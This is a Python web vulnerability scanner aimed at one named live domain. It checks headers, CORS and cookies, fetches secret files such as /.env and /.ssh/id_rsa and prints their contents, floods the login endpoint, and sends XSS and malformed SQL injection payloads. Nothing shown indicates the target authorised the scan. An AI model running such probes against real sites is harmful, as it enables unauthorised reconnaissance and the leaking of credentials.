import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

target = 'https://pinkier.store'
s = requests.Session()

def report(vuln, severity, req, res, rule_passed):
    print(f"VULNERABILITY: {vuln}")
    print(f"SEVERITY: {severity}")
    print(f"REQUEST: {req}")
    print(f"RESPONSE EVIDENCE: {res}")
    print(f"CONFIRMATION RULE PASSED: {rule_passed}\n")

# 1. Headers & Clickjacking
try:
    r = s.head(target)
    h = {k.lower(): v.lower() for k, v in r.headers.items()}
    req_sent = f"HEAD / HTTP/1.1\nHost: pinkier.store"
    
    missing = []
    if 'strict-transport-security' not in h: missing.append('Strict-Transport-Security')
    if 'content-security-policy' not in h: missing.append('Content-Security-Policy')
    if 'x-content-type-options' not in h: missing.append('X-Content-Type-Options')
    
    if missing:
        report("Missing Security Headers", "Low", req_sent, 
               f"{list(r.headers.keys())}", 
               f"yes and {', '.join(missing)} are literally absent from the raw response AND no equivalent exists")
               
    if 'x-frame-options' not in h and ('content-security-policy' not in h or 'frame-ancestors' not in h.get('content-security-policy', '')):
        report("Clickjacking", "Medium", req_sent,
               f"Headers: {list(r.headers.keys())}",
               "yes, X-Frame-Options is absent AND Content-Security-Policy either does not exist or does not contain frame-ancestors")

    if h.get('access-control-allow-origin') == '*' and h.get('access-control-allow-credentials') == 'true':
        report("Insecure CORS", "High", req_sent,
               "Access-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true",
               "yes, both are present simultaneously")
               
    if 'set-cookie' in h:
        cookie = h['set-cookie']
        missing_flags = []
        if 'httponly' not in cookie: missing_flags.append('HttpOnly')
        if 'secure' not in cookie: missing_flags.append('Secure')
        if 'samesite' not in cookie: missing_flags.append('SameSite')
        if missing_flags:
            report("Insecure Cookies", "Low", req_sent, cookie,
                   f"yes, flags literally absent: {', '.join(missing_flags)}")
except Exception as e:
    pass

# 2. Sensitive Files
files = [
    ('/.env', 'DB_PASSWORD'),
    ('/.git/config', '[core]'),
    ('/backup.sql', 'INSERT INTO'),
    ('/.ssh/id_rsa', 'BEGIN RSA'),
    ('/phpinfo.php', 'phpinfo()'),
    ('/actuator/env', 'datasource')
]
for path, kw in files:
    try:
        r = s.get(target + path, allow_redirects=False)
        if r.status_code == 200 and kw in r.text:
            report("Sensitive File Exposure", "High", f"GET {path} HTTP/1.1",
                   f"Status: 200\nBody snippet: {r.text[:100]}",
                   f"yes, status is 200 AND body contains {kw}")
    except:
        pass

# 3. Rate limiting
try:
    codes = []
    for _ in range(50):
        codes.append(s.post(target + '/login', timeout=3).status_code)
    if all(c not in (429, 0) for c in codes):
        report("Rate Limiting Missing", "Medium", f"POST /login (x50)",
               f"{codes}", "yes, every single response returned a non-429, non-connection-drop status code")
except:
    pass

# 4. XSS & SQLi
params = ['?id=', '?q=', '?search=']
for p in params:
    try:
        # XSS
        payload = 'CYBRAIN_XSS_<script>alert(1)</script>_END'
        r = s.get(target + '/' + p + payload)
        if payload in r.text:
            report("Reflected XSS", "High", f"GET /{p}{payload}", 
                   f"Body found exact string: {payload}",
                   "yes, exact string appears verbatim and unencoded in the raw response body")
        
        # SQLi
        payload_sqli = "' then ' OR 1=1--"
        rs = s.get(target + '/' + p + payload_sqli)
        errs = ['SQL syntax', 'ORA-', 'pg_query', 'mysqli_', 'unclosed quotation mark']
        for err in errs:
            if err in rs.text:
                report("SQL Injection", "Critical", f"GET /{p}{payload_sqli}",
                       f"Body contains: {err}",
                       f"yes, response body contains a real database error string such as {err}")
                break
    except:
        pass
